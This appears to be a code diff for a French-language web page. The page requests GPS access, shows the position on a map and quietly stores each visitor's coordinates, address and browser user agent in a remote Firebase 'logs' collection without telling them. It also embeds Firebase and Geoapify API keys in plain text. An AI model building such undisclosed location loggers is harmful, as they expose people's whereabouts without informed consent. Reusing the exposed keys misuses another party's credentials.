@@ -18,10 +18,10 @@ body {
 
 button {
   margin-top:20px;
-  padding:12px 20px;
-  font-size:16px;
+  padding:14px;
+  font-size:18px;
   border:none;
-  border-radius:8px;
+  border-radius:10px;
   background:#3b82f6;
   color:white;
 }
@@ -29,10 +29,6 @@ button {
 #map {
   height:60vh;
   margin-top:20px;
-}
-
-#info {
-  margin-top:10px;
 }
 </style>
 </head>
@@ -43,67 +39,65 @@ button {
 
 <button id="btn">ACTIVER LA LOCALISATION</button>
 
-<div id="info">
-  <p id="coords">En attente...</p>
-  <p id="address">Adresse inconnue</p>
-</div>
+<p id="status">En attente...</p>
+<p id="address"></p>
 
 <div id="map"></div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
-<!-- FIREBASE -->
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-  const firebaseConfig = {
-    apiKey: "AIzaSyAgwaKZKvLOW_GYpVirgywWETM4Kjz3dVQ",
-    authDomain: "mymaponline-d4fcf.firebaseapp.com",
-    projectId: "mymaponline-d4fcf",
-    storageBucket: "mymaponline-d4fcf.firebasestorage.app",
-    messagingSenderId: "294259967332",
-    appId: "1:294259967332:web:d81f81f5122ff5ef626671",
-    measurementId: "G-4M4S7687W5"
-  };
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+// 🔑 REMPLACE ICI
+const firebaseConfig = {
+  apiKey: "AIzaSyAgwaKZKvLOW_GYpVirgywWETM4Kjz3dVQ",
+  authDomain: "mymaponline-d4fcf.firebaseapp.com",
+  projectId: "mymaponline-d4fcf",
+  storageBucket: "mymaponline-d4fcf.firebasestorage.app",
+  messagingSenderId: "294259967332",
+  appId: "1:294259967332:web:d81f81f5122ff5ef626671",
+  measurementId: "G-4M4S7687W5"
+};
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-window.db = db;
-window.setDoc = setDoc;
-window.doc = doc;
-</script>
-
-<script>
 let map, marker;
-let userId = localStorage.getItem("id") || crypto.randomUUID();
-localStorage.setItem("id", userId);
 
-document.getElementById("btn").addEventListener("click", () => {
+document.getElementById("btn").addEventListener("click", async () => {
 
-  if (!navigator.geolocation) {
-    alert("Géolocalisation non supportée");
-    return;
+  const status = document.getElementById("status");
+
+  // 🔍 Vérification permission
+  if (navigator.permissions) {
+    try {
+      const perm = await navigator.permissions.query({ name: "geolocation" });
+
+      if (perm.state === "denied") {
+        status.innerText = "❌ GPS bloqué dans Chrome";
+        return;
+      }
+    } catch(e){}
   }
 
-  document.getElementById("coords").innerText = "Demande GPS...";
+  status.innerText = "Demande GPS...";
 
   navigator.geolocation.getCurrentPosition(async (pos) => {
 
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
 
-    document.getElementById("coords").innerText =
-      `Lat: ${lat} | Lon: ${lon}`;
+    status.innerText = "✅ Position OK";
 
-    // MAP
+    // 🗺️ MAP
     if (!map) {
       map = L.map('map').setView([lat, lon], 15);
 
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: "© OpenStreetMap"
-      }).addTo(map);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
+        .addTo(map);
 
       marker = L.marker([lat, lon]).addTo(map);
     } else {
@@ -111,43 +105,47 @@ document.getElementById("btn").addEventListener("click", () => {
       marker.setLatLng([lat, lon]);
     }
 
-    // GEOAPIFY (adresse)
+    // 🌍 GEOAPIFY
+    let address = "Inconnue";
+
     try {
       const res = await fetch(
         `https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`
       );
 
       const data = await res.json();
-      const address = data.features?.[0]?.properties?.formatted || "Adresse inconnue";
+      address = data.features?.[0]?.properties?.formatted || "Inconnue";
 
-      document.getElementById("address").innerText = address;
+    } catch(e){}
 
-      // FIREBASE SAVE
-      await window.setDoc(
-        window.doc(window.db, "positions", userId),
-        {
-          lat,
-          lon,
-          address,
-          time: new Date().toISOString()
-        }
-      );
+    document.getElementById("address").innerText = address;
 
-    } catch (e) {
-      console.log("Erreur API", e);
-    }
+    // 🔥 FIREBASE
+    await addDoc(collection(db, "logs"), {
+      lat,
+      lon,
+      address,
+      userAgent: navigator.userAgent,
+      time: new Date().toISOString()
+    });
 
   }, (err) => {
 
     if (err.code === 1) {
-      alert("❌ Autorisation refusée → autorise la localisation dans Chrome");
+      status.innerText = "❌ Refusé par navigateur";
+    } else if (err.code === 2) {
+      status.innerText = "❌ Position indisponible";
+    } else if (err.code === 3) {
+      status.innerText = "❌ Timeout";
     } else {
-      alert("❌ Erreur GPS");
+      status.innerText = "❌ Erreur inconnue";
     }
+
+    console.log(err);
 
   }, {
     enableHighAccuracy: true,
-    timeout: 10000,
+    timeout: 15000,
     maximumAge: 0
   });
 
